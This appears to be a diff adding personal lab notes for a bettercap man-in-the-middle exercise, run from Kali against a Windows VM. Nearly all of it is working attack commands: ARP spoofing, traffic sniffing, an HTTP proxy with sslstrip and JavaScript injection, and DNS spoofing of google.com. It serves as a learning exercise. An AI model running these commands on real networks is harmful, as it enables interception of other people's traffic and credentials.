@@ -1,0 +1,89 @@
+ARPple Step by step
+
+
+
+Kali main OS
+--------------------
+ip route
+ping win-vm
+sudo sysctl -w net.ipv4.ip_forward=1
+sudo bettercap -iface eth0
+net.probe on
+net.show
+set arp.spoof.targets 192.168.85.130
+arp.spoof on
+net.sniff on
+http.proxy on
+
+---> New terminal
+sudo Wireshark &
+run Wireshark app
+
+>-------------<
+--- after running  http sites on win-vm
+------
+Kali. Look for a [net.sniff.http.request] log entry in bettercap
+-------------
+
+arp.spoof off
+http.proxy off
+exit
+sudo sysctl -w net.ipv4.ip_forward=0
+
+###########################
+
+
+
+windows VM target (win-vm)
+---------------------
+ping google.com
+ping kali
+
+http://zero.webappsecurity.com/index.html
+http://demo.testfire.net/bank/login.aspx
+http://demo.testfire.net
+
+
+###########################################
+######################################
+############################################
+DNS Spoofing: Use the dns.spoof
+####
+
+sudo bettercap -iface eth0
+set arp.spoof.targets 172.20.10.4
+arp.spoof on
+net.probe on
+net.recon on
+set dns.spoof.domains google.com     
+set dns.spoof.address 172.20.10.5
+dns.spoof on
+
+	or    set dns.spoof.domains neverssl.com
+	or    set dns.spoof.address 192.168.85.128
+
+###Enable HTTP proxy in bettercap###
+
+Inside bettercap:
+
+sudo sysctl -w net.ipv4.ip_forward=1
+set http.proxy.sslstrip true
+set http.proxy.injectjs alert('You have been pwned!')
+http.proxy on
+net.sniff on
+
+
+###############
+if we have problem seeing ipv4 details try these
+
+net.recon off
+net.probe off
+arp.spoof on
+net.recon on
+
+
+
+
+
+
+
